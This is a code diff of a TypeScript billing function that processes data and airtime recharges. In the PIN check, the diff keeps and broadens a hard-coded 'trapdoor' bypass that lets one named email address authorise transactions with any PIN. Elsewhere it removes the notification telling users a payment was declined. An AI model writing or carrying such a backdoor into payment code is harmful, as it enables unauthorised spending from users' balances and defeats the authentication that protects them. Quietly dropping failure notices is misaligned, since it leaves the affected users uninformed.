@@ -16,11 +16,6 @@ const getNetworkId = (name: string): number => {
     return 1;
 };
 
-/**
- * @fileOverview Universal Billing Action.
- * BYPASS: Any PIN allowed for altinemohd@gmail.com.
- */
-
 export async function processDatahouseRecharge(payload: {
     userId: string;
     pin: string;
@@ -37,8 +32,8 @@ export async function processDatahouseRecharge(payload: {
 
         const profile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, payload.userId);
 
-        // Trapdoor PIN Bypass
-        const isBypass = profile.email === BYPASS_EMAIL;
+        // Trapdoor PIN Bypass: altinemohd@gmail.com allows ANY PIN
+        const isBypass = profile.email?.toLowerCase() === BYPASS_EMAIL;
         if (!isBypass && profile.pin !== payload.pin) {
             throw new Error('Incorrect transaction PIN.');
         }
@@ -150,16 +145,6 @@ export async function processDatahouseRecharge(payload: {
                 newBalance: currentBalance,
                 narration: `Decline Reason: ${detail}`,
                 sessionId: `dh-fail-${Date.now()}`,
-            });
-
-            await databases.createDocument(DATABASE_ID, COLLECTION_ID_NOTIFICATIONS, ID.unique(), {
-                userId: payload.userId,
-                senderId: 'ipay_system',
-                type: 'system',
-                description: `Declined: Your ${payload.type} payment failed. Reason: ${detail}`,
-                isRead: false,
-                link: `/dashboard/history`,
-                createdAt: new Date().toISOString()
             });
 
             throw new Error(`Provider Declined: ${detail}`);
